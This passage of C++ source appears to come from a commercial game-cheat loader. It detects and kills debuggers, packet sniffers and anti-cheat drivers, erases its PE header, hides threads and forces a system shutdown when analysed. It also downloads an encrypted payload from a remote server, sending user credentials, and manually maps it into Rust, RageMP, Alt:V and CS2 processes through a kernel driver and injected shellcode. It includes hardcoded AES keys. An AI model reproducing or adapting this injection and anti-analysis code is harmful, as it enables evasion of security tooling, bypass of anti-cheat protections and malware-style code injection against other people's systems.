						Logger(xorstr_("Delete Wireshark, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("TitanHide") != std::string::npos)
					{
						Logger(xorstr_("Delete TitanHide, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("vgk") != std::string::npos)
					{
						Logger(xorstr_("Disable Vanguard Anti-Cheat, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("faceitac") != std::string::npos)
					{
						Logger(xorstr_("Disable FaceIt Anti-Cheat, before launching loader. And restart your PC."), 1);
						return true;
					}
					/*if (strDriver.find("EasyAntiCheat") != std::string::npos)
					{
						Logger(xorstr_("Disable EAC Anti-Cheat, before launching loader. And restart your PC."), 1);
						return true;
					}*/
					if (strDriver.find("BEDaisy") != std::string::npos)
					{
						Logger(xorstr_("Disable Battleye Anti-Cheat, before launching loader. And restart your PC."), 1);
						return true;
					}
					if (strDriver.find("SharpOD_Drv") != std::string::npos)
					{
						Logger(xorstr_("Remove SharpOD, before launching loader. And restart your PC."), 1);
						return true;
					}
				}
			}
		}
		return false;
	}

	__forceinline DWORD sec::GetProcessIdFromName(LPCTSTR szProcessName)
	{
		PROCESSENTRY32 pe32;
		HANDLE hSnapshot = NULL;
		SecureZeroMemory(&pe32, sizeof(PROCESSENTRY32));

		// We want a snapshot of processes
		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		// Check for a valid handle, in this case we need to check for
		// INVALID_HANDLE_VALUE instead of NULL
		if (hSnapshot == INVALID_HANDLE_VALUE)
		{
			return 0;
		}

		// Now we can enumerate the running process, also 
		// we can't forget to set the PROCESSENTRY32.dwSize member
		// otherwise the following functions will fail
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnapshot, &pe32) == FALSE)
		{
			// Cleanup the mess
			CloseHandle(hSnapshot);
			return 0;
		}

		// Do our first comparison
		if (StrCmpI(pe32.szExeFile, szProcessName) == 0)
		{
			// Cleanup the mess
			CloseHandle(hSnapshot);
			return pe32.th32ProcessID;
		}

		// Most likely it won't match on the first try so 
		// we loop through the rest of the entries until
		// we find the matching entry or not one at all
		while (Process32Next(hSnapshot, &pe32))
		{
			if (StrCmpI(pe32.szExeFile, szProcessName) == 0)
			{
				// Cleanup the mess
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		}
		// If we made it this far there wasn't a match, so we'll return 0
		// _tprintf(_T("\n-> Process %s is not running on this system ..."), szProcessName);

		CloseHandle(hSnapshot);
		return 0;
	}

	__forceinline bool sec::analysis()
	{
		std::string szProcesses[] =
		{
			xorstr_("HttpAnalyzerStdV5.exe"),
			xorstr_("ollydbg.exe"),
			xorstr_("x64dbg.exe"),
			xorstr_("x32dbg.exe"),
			xorstr_("die.exe"),
			xorstr_("tcpview.exe"),			// Part of Sysinternals Suite
			xorstr_("autoruns.exe"),			// Part of Sysinternals Suite
			xorstr_("autorunsc.exe"),		// Part of Sysinternals Suite
			xorstr_("filemon.exe"),			// Part of Sysinternals Suite
			xorstr_("procmon.exe"),			// Part of Sysinternals Suite
			xorstr_("regmon.exe"),			// Part of Sysinternals Suite
			xorstr_("procexp.exe"),			// Part of Sysinternals Suite
			xorstr_("idaq.exe"),				// IDA Pro Interactive Disassembler
			xorstr_("idaq64.exe"),			// IDA Pro Interactive Disassembler
			xorstr_("ida.exe"),				// IDA Pro Interactive Disassembler
			xorstr_("ida64.exe"),			// IDA Pro Interactive Disassembler
			xorstr_("ImmunityDebugger.exe"), // ImmunityDebugger
			xorstr_("Wireshark.exe"),		// Wireshark packet sniffer
			xorstr_("dumpcap.exe"),			// Network traffic dump tool
			xorstr_("HookExplorer.exe"),		// Find various types of runtime hooks
			xorstr_("ImportREC.exe"),		// Import Reconstructor
			xorstr_("PETools.exe"),			// PE Tool
			xorstr_("LordPE.exe"),			// LordPE
			xorstr_("dumpcap.exe"),			// Network traffic dump tool
			xorstr_("SysInspector.exe"),		// ESET SysInspector
			xorstr_("proc_analyzer.exe"),	// Part of SysAnalyzer iDefense
			xorstr_("sysAnalyzer.exe"),		// Part of SysAnalyzer iDefense
			xorstr_("sniff_hit.exe"),		// Part of SysAnalyzer iDefense
			xorstr_("windbg.exe"),			// Microsoft WinDbg
			xorstr_("joeboxcontrol.exe"),	// Part of Joe Sandbox
			xorstr_("joeboxserver.exe"),		// Part of Joe Sandbox
			xorstr_("fiddler.exe"),
			xorstr_("tv_w32.exe"),
			xorstr_("tv_x64.exe"),
			xorstr_("Charles.exe"),
			xorstr_("netFilterService.exe"),
			xorstr_("HTTPAnalyzerStdV7.exe")
		};
		WORD iLength = sizeof(szProcesses) / sizeof(szProcesses[0]);
		for (int i = 0; i < iLength; i++)
		{
			if (GetProcessIdFromName(szProcesses[i].c_str()))
			{
				killProcessByName(szProcesses[i].c_str());
				return true;
			}
		}
		return false;
	}

	__forceinline bool sec::TestSign()
	{
		HMODULE ntdll = hash_GetModuleHandleA(xorstr_("ntdll.dll"));

		auto NtQuerySystemInformation = (t_NtQuerySystemInformation)hash_GetProcAddress(ntdll, xorstr_("NtQuerySystemInformation"));

		SYSTEM_CODEINTEGRITY_INFORMATION cInfo;
		cInfo.Length = sizeof(cInfo);

		NtQuerySystemInformation(
			SystemCodeIntegrityInformation,
			&cInfo,
			sizeof(cInfo),
			NULL
		);

		return (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
			|| (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED);
	}

	__forceinline void sec::clown()
	{
		MakeCritical();
		shutdown();
	}

	__forceinline bool sec::start()
	{
		return IsRemoteSession() || IsDebuggersInstalledThread() || analysis();
	}
	__forceinline void sec::ErasePEHeaderFromMemory()
	{
		DWORD OldProtect = 0;

		// Get base address of module
		char* pBaseAddr = (char*)GetModuleHandle(NULL);

		// Change memory protection
		VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
			PAGE_READWRITE, &OldProtect);

		// Erase the header
		ZeroMemory(pBaseAddr, 4096);
	}
	__forceinline bool HideThread(HANDLE hThread)
	{
		typedef NTSTATUS(NTAPI* pNtSetInformationThread)
			(HANDLE, UINT, PVOID, ULONG);

		NTSTATUS Status;

		// Get NtSetInformationThread
		pNtSetInformationThread NtSIT = (pNtSetInformationThread)
			GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread");
		// Shouldn't fail
		if (NtSIT == NULL)
			return false;

		// Set the thread info
		if (hThread == NULL)
			Status = NtSIT(GetCurrentThread(),
				0x11, //ThreadHideFromDebugger
				0, 0);
		else
			Status = NtSIT(hThread, 0x11, 0, 0);

		if (Status != 0x00000000)
			return false;
		else
			return true;
	}
	void checkPEB()
	{
		PBOOLEAN BeingDebugged = (PBOOLEAN)__readgsqword(0x60) + 2;
		if (*BeingDebugged)
		{
			shutdown();
		}
	}
	__forceinline void sec::ST()
	{
		HideThread(GetCurrentThread);
		while (true)
		{
			if (start())
			{
				uLoader::globalbanshwid(xorstr_("1")); //ban
				uLoader::banuseractivate(); //ban

				Logger(xorstr_("Analysis."), 2);

				ShellExecute(NULL, xorstr_("open"), xorstr_("https://www.youtube.com/watch?v=RRHK-7OtoIc&t=663s"), NULL, NULL, SW_HIDE);
				clown();
			}
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}
}

void HandleUserActivity()
{
	if (IsDebugging() || IsAnalysing())
	{
		sec::Logger(xorstr_("User Activity Error."), 1);
		ErasePEHeaderFromMemory();
		HANDLE m_hProcess = LI_FN(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, 0, GetCurrentProcessId());
		TerminateProcess(m_hProcess, 0);
	}
}



static int tab = 0;
static bool banned = false;
static bool activation_invalid_key = false;
static bool activation_unknown_cheat = false;
static bool activation_expired_subscribe = false;
static bool activation_data_error = false;
static bool injectionq = false;



class Inject
{
public:
	Inject() {};
	~Inject() {};
	bool inject_module_from_path_to_process_by_name(const wchar_t* process_name, int productgame);

private:

};
#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)

//keep this 
#pragma runtime_checks( "", off )
#pragma optimize( "", off )
void __stdcall shellcode()
{
	uintptr_t base = 0x15846254168; // random
	uintptr_t pointer_address = 0x24856841253; // random

	memset((void*)pointer_address, 0x69, 1);

	BYTE* pBase = (BYTE*)base;
	auto* pOpt = &reinterpret_cast<IMAGE_NT_HEADERS*>(pBase + reinterpret_cast<IMAGE_DOS_HEADER*>((uintptr_t)pBase)->e_lfanew)->OptionalHeader;

	auto _LoadLibraryA = LI_FN(LoadLibraryA).get();
	auto _GetProcAddress = LI_FN(GetProcAddress).get();
	auto _RtlAddFunctionTable = LI_FN(RtlAddFunctionTable).get();

	auto _DllMain = reinterpret_cast<BOOL(WINAPI*)(void* hDll, DWORD dwReason, void* pReserved)>(pBase + pOpt->AddressOfEntryPoint);

	BYTE* LocationDelta = pBase - pOpt->ImageBase;
	if (LocationDelta) {
		if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
			auto* pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			const auto* pRelocEnd = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<uintptr_t>(pRelocData) + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
			while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
				UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				WORD* pRelativeInfo = reinterpret_cast<WORD*>(pRelocData + 1);

				for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo) {
					if (RELOC_FLAG64(*pRelativeInfo)) {
						UINT_PTR* pPatch = reinterpret_cast<UINT_PTR*>(pBase + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
						*pPatch += reinterpret_cast<UINT_PTR>(LocationDelta);
					}
				}
				pRelocData = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<BYTE*>(pRelocData) + pRelocData->SizeOfBlock);
			}
		}
	}

	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		auto* pImportDescr = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImportDescr->Name) {
			char* szMod = reinterpret_cast<char*>(pBase + pImportDescr->Name);
			HINSTANCE hDll = _LoadLibraryA(szMod);

			ULONG_PTR* pThunkRef = reinterpret_cast<ULONG_PTR*>(pBase + pImportDescr->OriginalFirstThunk);
			ULONG_PTR* pFuncRef = reinterpret_cast<ULONG_PTR*>(pBase + pImportDescr->FirstThunk);

			if (!pThunkRef)
				pThunkRef = pFuncRef;

			for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
				if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
					*pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, reinterpret_cast<char*>(*pThunkRef & 0xFFFF));
				}
				else {
					auto* pImport = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(pBase + (*pThunkRef));
					*pFuncRef = (ULONG_PTR)_GetProcAddress(hDll, pImport->Name);
				}
			}
			++pImportDescr;
		}
	}

	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
		auto* pTLS = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		auto* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
		for (; pCallback && *pCallback; ++pCallback)
			(*pCallback)(pBase, DLL_PROCESS_ATTACH, nullptr);
	}


	//SEH SUPPORT
	auto excep = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	if (excep.Size) {
		if (!_RtlAddFunctionTable(
			reinterpret_cast<IMAGE_RUNTIME_FUNCTION_ENTRY*>(pBase + excep.VirtualAddress),
			excep.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY), (DWORD64)pBase)) {
		}
	}

	_DllMain(pBase, DLL_PROCESS_ATTACH, 0);
}
class Driver
{
public:
	Driver(const wchar_t* driver_name, int target_process_id);
	~Driver();
	uintptr_t get_base_address(const wchar_t* process_name);
	uintptr_t allocate_virtual_memory(int size, int allocation_type, int protect_type);
	bool protect_virtual_memory(uintptr_t address, int size, int protect_type);
	bool write_memory(uintptr_t destination, uintptr_t source, int size);
	bool read_memory(uintptr_t source, uintptr_t destination, int size);
	HANDLE driver_handle;
	int target_process_id;
private:

	/*
			Driver Structs
	*/
	typedef struct _k_get_base_module_request {
		ULONG pid;
		ULONGLONG handle;
		WCHAR name[260];
	} k_get_base_module_request, * pk_get_base_module_request;

	typedef struct _k_rw_request {
		ULONG pid;
		ULONGLONG src;
		ULONGLONG dst;
		ULONGLONG size;
	} k_rw_request, * pk_rw_request;

	typedef struct _k_alloc_mem_request {
		ULONG pid, allocation_type, protect;
		PVOID addr;
		SIZE_T size;
	} k_alloc_mem_request, * pk_alloc_mem_request;

	typedef struct _k_protect_mem_request {
		ULONG pid, protect;
		ULONGLONG addr;
		SIZE_T size;
	} k_protect_mem_request, * pk_protect_mem_request;

	/*
		Driver IOCTL codes
	*/
	//#define ioctl_read_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x093286, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
	//#define ioctl_write_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x729823, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
	//#define ioctl_get_module_base CTL_CODE(FILE_DEVICE_UNKNOWN, 0x461419, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) 
	//#define ioctl_protect_virutal_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x433146, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) 
	//#define ioctl_allocate_virtual_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x523794, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define ioctl_read_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define ioctl_write_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define ioctl_get_module_base CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) 
#define ioctl_protect_virutal_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) 
#define ioctl_allocate_virtual_memory CTL_CODE(FILE_DEVICE_UNKNOWN, 0x812, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
};
Driver::Driver(const wchar_t* driver_name, int target_process_id)
{
	this->driver_handle = CreateFileW(driver_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	this->target_process_id = target_process_id; // yes i am lazy
}
Driver::~Driver()
{
	CloseHandle(driver_handle);
}
uintptr_t Driver::get_base_address(const wchar_t* process_name)
{
	if (!driver_handle) return 0;

	k_get_base_module_request request;
	request.pid = target_process_id;

	memset(request.name, 0, sizeof(WCHAR) * 260);
	wcscpy(request.name, process_name);
	request.handle = 0; // Make Sure that it is 0 so it doesnt return another one

	DeviceIoControl(driver_handle, ioctl_get_module_base, &request, sizeof(k_get_base_module_request), &request, sizeof(k_get_base_module_request), 0, 0);
	return request.handle;
}

uintptr_t Driver::allocate_virtual_memory(int size, int allocation_type, int protect_type)
{
	if (!driver_handle) return 0;
	k_alloc_mem_request request;
	request.pid = this->target_process_id;
	request.addr = (PVOID)(0);
	request.size = size;
	request.allocation_type = allocation_type;
	request.protect = protect_type;
	DeviceIoControl(driver_handle, ioctl_allocate_virtual_memory, &request, sizeof(k_alloc_mem_request), &request, sizeof(k_alloc_mem_request), 0, 0);
	return (uintptr_t)request.addr;

}
bool Driver::write_memory(uintptr_t destination, uintptr_t source, int size)
{
	if (driver_handle == INVALID_HANDLE_VALUE) return 0;
	k_rw_request request;
	request.pid = this->target_process_id;
	request.dst = destination;
	request.src = source;
	request.size = size;
	return DeviceIoControl(driver_handle, ioctl_write_memory, &request, sizeof(k_rw_request), 0, 0, 0, 0);
}
bool Driver::read_memory(uintptr_t source, uintptr_t destination, int size)
{
	if (driver_handle == INVALID_HANDLE_VALUE) return 0;
	k_rw_request request;
	request.pid = this->target_process_id;
	request.dst = destination;
	request.src = source;
	request.size = size;
	return DeviceIoControl(driver_handle, ioctl_read_memory, &request, sizeof(k_rw_request), 0, 0, 0, 0);
}

bool Driver::protect_virtual_memory(uintptr_t address, int size, int protect_type)
{
	if (!driver_handle) return 0;
	k_protect_mem_request request;
	request.pid = this->target_process_id;
	request.addr = address;
	request.size = size;
	request.protect = protect_type;
	return DeviceIoControl(driver_handle, ioctl_protect_virutal_memory, &request, sizeof(k_protect_mem_request), &request, sizeof(k_protect_mem_request), 0, 0);

}


bool Inject::inject_module_from_path_to_process_by_name(const wchar_t* process_name, int productgame) //1 rust, 2 ragemp, 3 altv
{

	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	char request[512];
	LI_FN(sprintf)(request, xor_a("https://amph.su/client/session.php"));
	std::string unprotect_request;
	CURL* curlq;
	CURLcode resq;
	curlq = curl_easy_init();
	if (curlq) {
		curl_easy_setopt(curlq, CURLOPT_URL, request);
		curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
		resq = curl_easy_perform(curlq);
		curl_easy_cleanup(curlq);
	}
	//unprotect_request = DownloadString(request);
	unprotect_request = aes::decrypt(unprotect_request, xor_a("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xor_a("H1ggF9foFGLerr8q"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	
	unprotect_request = aes::encrypt(unprotect_request.c_str(), xor_a("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xor_a("H1ggF9foFGLerr8q")); // static keys	
	//LI_FN(sprintf)(request, /*RAGEMP_inject.php*/ xor_a("https://amph.su/client/RAGEMP_inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	//LI_FN(sprintf)(request, /*RAGEMP_inject.php*/ xor_a("https://amph.su/client/RAGEMPTESTADMINinject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());

	//LI_FN(sprintf)(request, /*ALTV_INJECT.php*/ xor_a("https://amph.su/client/ALTV_INJECT.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());

	//LI_FN(sprintf)(request, /*alkad.php*/ xor_a("https://amph.su/client/inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());

	switch (productgame)
	{
	case 1: // alkad
		LI_FN(sprintf)(request, /*alkad.php*/ xor_a("https://amph.su/client/inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), aes::encrypt("Alkad Inject Cheat", tempory_cipher_key, tempory_iv_key).c_str());
		break;
	case 2: //ragemp
		LI_FN(sprintf)(request, /*RAGEMP_inject.php*/ xor_a("https://amph.su/client/RAGEMP_inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), aes::encrypt("RageMP Inject Cheat", tempory_cipher_key, tempory_iv_key).c_str());
		break;
	case 3: //altv
		LI_FN(sprintf)(request, /*ALTV_INJECT.php*/ xor_a("https://amph.su/client/ALTV_INJECT.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), aes::encrypt("Alt:V Inject Cheat", tempory_cipher_key, tempory_iv_key).c_str());
		break;
	}


	CURL* curl;
	CURLcode res;
	std::string response;
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, request);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}
	//std::string response = DownloadString(request);
	if (response == aes::encrypt(xor_a("file_error"), tempory_cipher_key, tempory_iv_key)) {
		printf(xor_a("_error!\n"));
		system("pause");
		return NULL;
	}
	for (int i = 0; i < response.size(); i++)
		response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];
	int target_process_id = utils::get_pid_from_name(process_name);
	if (!target_process_id)
	{
		//printf(xor_a("Target Process not found!\n"));
		printf(xor_a("Process Game not found!\n"));
		system("pause");
		return false;
	}
	printf(xor_a("Target Process Id is : %i\n"), target_process_id);
	auto target_process_hwnd = utils::get_hwnd_of_process_id(target_process_id); // HWND needed for hook
	auto nt_dll = LoadLibraryA(xor_a("ntdll.dll"));
	auto thread_id = GetWindowThreadProcessId(target_process_hwnd, 0); // also needed for hook

	PIMAGE_NT_HEADERS nt_header = utils::get_nt_header((uintptr_t)response.c_str());
	Driver* driver = new Driver(xor_w(L"\\\\.\\ljgfhdl345"), target_process_id);
	if (driver->driver_handle == NULL)
	{
		printf(xor_a("Driver not loaded\n"));
		system("pause");
	}
	//uintptr_t target_process_base_address = driver->get_base_address(process_name);
	uintptr_t allocated_base = driver->allocate_virtual_memory(nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	driver->protect_virtual_memory((uintptr_t)allocated_base, nt_header->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE);
	printf(xor_a("Allocated 0x%p at %p\n"), nt_header->OptionalHeader.SizeOfImage, allocated_base);
	printf(xor_a("OK (1)\n"));
	if (!driver->write_memory((uintptr_t)allocated_base, (uintptr_t)(uintptr_t)response.c_str(), 0x1000))
	{
		printf(xor_a("Failed writing memory\n"));
	}
	printf(xor_a("OK (Successfully)\n"));
	printf(xor_a("Successfully wrote at %p\n"), allocated_base);
	IMAGE_SECTION_HEADER* section_header = IMAGE_FIRST_SECTION(nt_header);
	for (int i = 0; i != nt_header->FileHeader.NumberOfSections; i++, ++section_header)
	{
		if (section_header->SizeOfRawData)
		{
			if (!driver->write_memory((uintptr_t)allocated_base + section_header->VirtualAddress, (uintptr_t)(uintptr_t)response.c_str() + section_header->PointerToRawData, section_header->SizeOfRawData)) {
				printf(xor_a("Failed writing memory at %p\n"), allocated_base + section_header->VirtualAddress);
				printf(xor_a("Failed writing memory\n"));
				return false;
			}
		}
	}
	printf(xor_a("Successfully wrote sections!\n"));
	printf(xor_a("OK (Successfully 2)\n"));
	uintptr_t allocated_shellcode = driver->allocate_virtual_memory(0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	uintptr_t shellcode_value = driver->allocate_virtual_memory(sizeof(int), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // there we set the value to stop the hook once the shellcode is called!
	printf(xor_a("Allocated 0x%p at %p\n"), 0x1000, allocated_shellcode);
	printf(xor_a("OK (3)\n"));
	uintptr_t allocatedbase_offset = uintptr_t((uintptr_t)utils::find_pattern(xor_a("\x68\x41\x25\x46\x58\x01\x00\x00"), xor_a("xxxxxx??")) - (uintptr_t)&shellcode); //scans the value 0x15846254168 in shellcode
	uintptr_t allocatedvalue_offset = uintptr_t((uintptr_t)utils::find_pattern(xor_a("\x53\x12\x84\x56\x48\x02\x00\x00"), xor_a("xxxxxx??")) - (uintptr_t)&shellcode); // scans the value 0x24856841253 in shellcode
	if (!allocatedbase_offset || !allocatedvalue_offset)
	{
		printf(xor_a("Check signatures !\n"));
		return false;
	}
	auto shellcodefunction_length = utils::get_function_length(&shellcode);
	uintptr_t localshellcodealloc = (uintptr_t)VirtualAlloc(0, shellcodefunction_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy((PVOID)localshellcodealloc, &shellcode, shellcodefunction_length);
	*(uintptr_t*)(localshellcodealloc + allocatedbase_offset) = allocated_base;
	*(uintptr_t*)(localshellcodealloc + allocatedvalue_offset) = shellcode_value;
	driver->write_memory(allocated_shellcode, localshellcodealloc, 0x1000);


	auto win_event_hook = SetWinEventHook(EVENT_MIN, EVENT_MAX, nt_dll, (WINEVENTPROC)allocated_shellcode, target_process_id, thread_id, WINEVENT_INCONTEXT); //WH_KEYBOARD  //WINEVENT_INCONTEXT; //WH_KEYBOARD  //WINEVENT_INCONTEXT
	//switch (productgame)
	//{
	//case 1: // alkad
	//	win_event_hook = SetWinEventHook(EVENT_MIN, EVENT_MAX, nt_dll, (WINEVENTPROC)allocated_shellcode, target_process_id, thread_id, WH_KEYBOARD); //WH_KEYBOARD  //WINEVENT_INCONTEXT
	//	break;
	//case 2: //ragemp

	//	break;
	//case 3: //altv

	//	break;
	//}

	//HHOOK win_event_hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)allocated_shellcode, nt_dll, thread_id);

	/*HHOOK win_event_hook_other;
	if (productgame != 1) {
		win_event_hook_other = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)allocated_shellcode, nt_dll, thread_id);
		PostThreadMessage(thread_id, WM_NULL, 0, 0);
	}*/

	printf(xor_a("Open the game window!\n"));
	//bool dgfh = false;
	while (true)
	{
		int buffer;
		driver->read_memory(shellcode_value, (uintptr_t)&buffer, sizeof(int));
		if (buffer == 0x69) { // if shellcode called
		//if (buffer != 0) { // if shellcode called
			printf(("[OK] (UnhookWindowsHookEx.)\n"));
			
			//UnhookWinEvent(win_event_hook);
			//if (productgame == 1) {
				UnhookWinEvent(win_event_hook);
				//UnhookWindowsHookEx(win_event_hook);

			/*}
			else {
			.	UnhookWindowsHookEx(win_event_hook_other);
			}*/

			//dgfh = true;
			return true;
		}
	}
	printf(("[OK] (goods.)\n"));
	return false;
}




__forceinline bool Inject_CS2()
{
	std::string tempory_cipher_key;
	std::string tempory_iv_key;
	std::vector<std::string> vector_tempory_key;
	char request[512];
	li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	std::string unprotect_request;
	CURL* curlq;
	CURLcode resq;
	curlq = curl_easy_init();
	if (curlq) {
		curl_easy_setopt(curlq, CURLOPT_URL, request);
		curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
		resq = curl_easy_perform(curlq);
		curl_easy_cleanup(curlq);
	}
	unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
		tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
		tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt(pornushka, tempory_cipher_key, tempory_iv_key);
	std::string protect_pornushka = aes::encrypt("CS2 INJECT", tempory_cipher_key, tempory_iv_key);
	unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	li(sprintf)(request, xorstr_("https://amph.su/client/CS2_inject.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	std::string response;
	CURL* curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, request);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
